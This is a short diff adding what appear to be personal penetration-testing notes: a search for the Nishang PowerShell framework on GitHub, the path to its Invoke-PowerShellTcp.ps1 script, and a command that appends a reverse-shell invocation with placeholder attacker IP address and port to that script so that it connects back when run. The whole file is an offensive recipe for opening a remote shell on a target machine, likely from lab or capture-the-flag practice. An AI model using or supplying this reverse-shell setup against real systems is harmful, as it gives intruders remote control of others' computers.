@@ -1,0 +1,7 @@
+
+firefox::: nishang site:github.com							('samratashok')
+
+
+							./Shells/Invoke-PowerShellTcp.ps1
+
+	Invoke-PowerShellTcp -Reverse -IPAddress myIpHere -Port myPortHere  >>  Invoke-PowerShellTcp.ps1
